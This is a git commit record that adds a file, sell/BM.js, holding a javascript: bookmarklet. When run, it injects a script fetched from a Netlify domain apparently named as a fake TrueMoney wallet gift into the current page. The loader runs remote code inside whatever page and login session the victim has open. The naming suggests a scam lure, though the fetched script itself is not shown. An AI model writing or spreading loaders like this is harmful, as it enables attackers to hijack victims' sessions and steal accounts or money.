e047e5860541e46691a17726c7cd3e083ac6222f
P200p <taislot1999@gmail.com>
2025-08-02 10:26:44 +0700

    Create BM.js

---
+++ sell/BM.js
@@ -0,0 +1,9 @@
+javascript:(function(){
+  try {
+    var s = document.createElement('script');
+    s.src = 'https://giftforyoutruemoneywalletfake.netlify.app/sell/index.js';
+    document.body.appendChild(s);
+  } catch(e) {
+    console.error('Error loading index.js', e);
+  }
+})();
